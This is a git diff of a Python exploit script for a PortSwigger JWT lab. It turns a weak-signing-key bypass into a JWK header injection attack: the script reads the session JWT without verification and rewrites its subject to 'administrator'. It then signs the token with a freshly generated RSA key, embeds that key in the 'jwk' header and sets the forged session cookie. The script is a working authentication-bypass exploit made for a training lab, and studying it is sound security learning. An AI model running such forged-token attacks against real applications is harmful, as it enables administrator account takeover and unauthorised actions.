@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
-# JWT authentication bypass via weak signing key
-# Lab-Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
+# JWT authentication bypass via jwk header injection
+# Lab-Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection
 # Difficulty: PRACTITIONER
 from bs4 import BeautifulSoup
+import json
+from jwcrypto import jwk
 import jwt
 import requests
 import sys
@@ -31,13 +33,19 @@ def login(client, host, username, password):
 def manipulate_cookie(client, host):
     cookie = client.cookies.get('session')
 
-    # Secret appears to be static for this lab
-    key = 'secret1'
-
     payload = jwt.decode(cookie, options={"verify_signature": False})
     payload['sub'] = 'administrator'
 
-    cookie = jwt.encode(payload, key, algorithm="HS256")
+    key = jwk.JWK.generate(kty='RSA', size=2048)
+    public_key = key.export_public()    
+    private_key = key.export_to_pem(private_key=True, password=None)
+    print(f"[+] Generated RSA key pair")
+
+    cookie = jwt.encode(payload,
+                        private_key,
+                        algorithm="RS256",
+                        headers={"jwk": json.loads(public_key)})
+    print(f"[+] Encoded JWT and injected JWK")
 
     client.cookies.set('session', cookie, domain=f'{host[8:]}')
     return True
@@ -49,7 +57,7 @@ def delete_carlos(client, host):
 
 
 def main():
-    print('[+] JWT authentication bypass via weak signing key')
+    print('[+] JWT authentication bypass via jwk header injection')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
